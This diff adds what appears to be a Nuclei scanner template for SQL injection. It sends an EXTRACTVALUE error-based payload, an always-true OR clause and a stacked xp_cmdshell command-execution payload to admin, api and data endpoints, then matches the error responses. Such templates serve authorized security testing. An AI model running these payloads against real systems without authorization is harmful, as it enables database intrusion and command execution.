@@ -1,0 +1,41 @@
+id: sqli-p4
+
+info:
+  name: SQL Injection - Advanced Techniques
+  author: custom
+  severity: critical
+  description: Advanced SQL injection including EXTRACTVALUE and command execution
+  tags: sqli,waf-bypass,advanced,rce,injection
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?id={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        id={{payload}}
+
+    payloads:
+      payload:
+        - "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user()))) -- -"
+        - "' OR 'x'='x' #"
+        - "1; EXEC xp_cmdshell('dir'); --"
+      path:
+        - "admin"
+        - "api"
+        - "data"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "XPATH"
+          - "xp_cmdshell"
+          - "error"
+        condition: or
